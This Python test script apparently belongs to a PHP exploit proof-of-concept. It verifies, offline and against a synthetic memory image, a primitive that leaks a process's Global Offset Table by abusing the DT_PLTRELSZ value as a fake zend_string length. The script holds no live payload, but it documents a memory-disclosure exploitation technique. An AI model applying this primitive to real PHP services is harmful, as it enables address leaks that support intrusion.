#!/usr/bin/env python3 -I
"""Verifier for got_pltrelsz_read.py (offline; no lab needed).

Drives read_got_via_pltrelsz over a synthetic in-memory image + an injected
read_fn (zend_string read semantics) + a fake resolver supplying __dynamic__.
The image lays out a .dynamic with DT_PLTRELSZ whose d_val is used as the fake
string length that over-reads the GOT. Asserts the returned GOT bytes + data
start, and the (None, None) failure paths.

    python3 -I poc/primitives/read_leak/verify_got_pltrelsz_read.py
"""
from __future__ import annotations

import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.read_leak import got_pltrelsz_read as G  # noqa: E402

MBASE = 0x7f0000000000
DYN = MBASE + 0x100
GOT = b"\x00" * 8 + b"".join(struct.pack("<Q", 0x7f00deadbe00 + i * 0x1000) for i in range(7))


def build_mem(pltrelsz_tag=2):
    """Flat image: [entry0][DT_PLTRELSZ entry1][GOT...]. GOT is the tail."""
    dyn_off = DYN - MBASE
    mem = bytearray(dyn_off + 0x20 + len(GOT))
    struct.pack_into("<QQ", mem, dyn_off + 0x00, 1, 0x1000)            # entry0: tag=1, d_val=slen anchor
    struct.pack_into("<QQ", mem, dyn_off + 0x10, pltrelsz_tag, len(GOT))  # entry1: DT_PLTRELSZ
    mem[dyn_off + 0x20:dyn_off + 0x20 + len(GOT)] = GOT                # GOT (its first qword 0 ends the DT scan)
    return mem


def make_read_fn(mem):
    def read_fn(fake_str_addr, timeout=5):
        lo = (fake_str_addr + 0x10) - MBASE
        do = (fake_str_addr + 0x18) - MBASE
        if lo < 0 or lo + 8 > len(mem) or do < 0 or do > len(mem):
            return None
        return (struct.unpack_from("<Q", mem, lo)[0], bytes(mem[do:]))
    return read_fn


class FakeResolver:
    def __init__(self, phnum=12, dynamic=DYN):
        self._phnum = phnum
        self._dynamic = dynamic

    def _read_elf_header(self, base):
        return self._phnum

    def _elf_resolve_symbols(self, base, phnum, names):
        return {"__dynamic__": self._dynamic} if self._dynamic else {}


def check(name, cond):
    print(("  ok   " if cond else "  FAIL ") + name)
    return cond


def main():
    ok = True

    print("## GOT over-read via DT_PLTRELSZ len anchor")
    G.set_resolver(FakeResolver())
    got, ds = G.read_got_via_pltrelsz(make_read_fn(build_mem()), MBASE)
    ok &= check("returned GOT bytes == planted GOT", got == GOT)
    ok &= check("data_start = &DT_PLTRELSZ.d_val + 8 = DYN+0x20", ds == DYN + 0x20)
    ok &= check("GOT first qword is 0 (DT terminator / GOT[0])",
                got is not None and struct.unpack_from("<Q", got, 0)[0] == 0)
    ok &= check("GOT carries the planted external pointers",
                got is not None and struct.unpack_from("<Q", got, 8)[0] == 0x7f00deadbe00)

    print("## resolver yields no __dynamic__ -> (None, None)")
    G.set_resolver(FakeResolver(dynamic=None))
    ok &= check("(None, None)", G.read_got_via_pltrelsz(make_read_fn(build_mem()), MBASE) == (None, None))

    print("## _read_elf_header returns None -> (None, None)")
    class NoElf(FakeResolver):
        def _read_elf_header(self, base):
            return None
    G.set_resolver(NoElf())
    ok &= check("(None, None)", G.read_got_via_pltrelsz(make_read_fn(build_mem()), MBASE) == (None, None))

    print("## no DT_PLTRELSZ in .dynamic -> (None, None)")
    G.set_resolver(FakeResolver())
    ok &= check("(None, None)",
                G.read_got_via_pltrelsz(make_read_fn(build_mem(pltrelsz_tag=1)), MBASE) == (None, None))

    print("\n==== verify_got_pltrelsz_read: %s ====" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
